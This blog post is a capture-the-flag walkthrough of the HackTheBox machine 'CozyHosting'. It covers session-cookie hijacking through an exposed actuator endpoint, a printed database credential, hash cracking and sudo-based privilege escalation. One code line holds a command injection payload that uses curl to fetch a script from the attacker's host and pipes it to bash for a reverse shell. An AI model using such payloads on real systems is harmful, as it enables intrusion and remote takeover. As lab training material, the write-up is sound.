---
layout: post
title: "CozyHosting"
description: "CozyHosting is an Easy rated Linux machine on HTB."
categories: [CTF,HTB]
tags: [Linux,Easy]
author: g
---

## Nmap:
![Pasted image 20240715100803.png](/images/Pasted image 20240715100803.png){: .normal }


## Shell access

Add the `cozyhosting.htb` domain to the hosts file.
![Pasted image 20240715100809.png](/images/Pasted image 20240715100809.png){: .normal width="500" }


### Enumerating port 80
Default/standard credentials don't seem to work on the login page.
![Pasted image 20240715100757.png](/images/Pasted image 20240715100757.png){: .normal width="450" }

Directory busting using Dirsearch:
![Pasted image 20240715100753.png](/images/Pasted image 20240715100753.png){: .normal }

The `/actuator/sessions` seems interesting, visiting it results in a bunch of cookies being exposed, these could be used to try and login to the application if they are still valid.
![Pasted image 20240715100749.png](/images/Pasted image 20240715100749.png){: .normal width="450" }

The first cookie that belongs to the kanderson user was used to authenticate.
![Pasted image 20240715100743.png](/images/Pasted image 20240715100743.png){: .normal }


On the admin page we get a hint about SSH keys, the payload can be inspected in Burp.
![Pasted image 20240715100739.png](/images/Pasted image 20240715100739.png){: .normal }


After trying out a few things I found out that leaving the username blank returned some sort of man page. This means we could possibly get RCE.
![Pasted image 20240715100736.png](/images/Pasted image 20240715100736.png){: .normal }

Since we arent allowed to use whitespaces in the username section we’ll have to be creative with the payload:
```bash
# payload: 
host=127.0.0.1&username=";$(curl${IFS}10.10.14.153:8000/payload.sh|bash)"
```
![Pasted image 20240715100727.png](/images/Pasted image 20240715100727.png){: .normal }


On our machine we created a reverse shell bash script that we execute using curl.
![Pasted image 20240715100718.png](/images/Pasted image 20240715100718.png){: .normal width="450" }


The script can be accessed because we are running a Python server in the directory of the script.
![Pasted image 20240715100713.png](/images/Pasted image 20240715100713.png){: .normal }


Shell as the app user:
![Pasted image 20240715100706.png](/images/Pasted image 20240715100706.png){: .normal }



## Lateral movement
Transfer the jar file that is located in the app directory:
![Pasted image 20240715100701.png](/images/Pasted image 20240715100701.png){: .normal }
![Pasted image 20240715100657.png](/images/Pasted image 20240715100657.png){: .normal width="250" }

In the jar file credentials were identified: `postgres:Vg&nvzAQ7XxR`.
![Pasted image 20240715100650.png](/images/Pasted image 20240715100650.png){: .normal }

The previous credentials were used to authenticate to the postgres database. Inside of this database, we find the following credentials:
![Pasted image 20240715100646.png](/images/Pasted image 20240715100646.png){: .normal }

The admin password hash can be cracked using JohnTheRipper.
![Pasted image 20240715100641.png](/images/Pasted image 20240715100641.png){: .normal }

In `/etc/passwd` we can only find the Josh user.
![Pasted image 20240715100637.png](/images/Pasted image 20240715100637.png){: .normal }


SSH as the Josh user:
![Pasted image 20240715100632.png](/images/Pasted image 20240715100632.png){: .normal }


## Priv Esc
Sudo -l output.
![Pasted image 20240715100630.png](/images/Pasted image 20240715100630.png){: .normal }


GTFObins can be used to elevate to root using SSH:
![Pasted image 20240715100626.png](/images/Pasted image 20240715100626.png){: .normal width="650" }


## User.txt
![Pasted image 20240715100621.png](/images/Pasted image 20240715100621.png){: .normal width="400" }

## Root.txt
![Pasted image 20240715100615.png](/images/Pasted image 20240715100615.png){: .normal width="400" }


## Pwned
![Pasted image 20240715100608.png](/images/Pasted image 20240715100608.png){: .normal }


### Sources:
- [RCE without spaces](https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces)
- [Send files via NC](https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/)
- [Priv Esc](https://gtfobins.github.io/gtfobins/ssh/#sudo)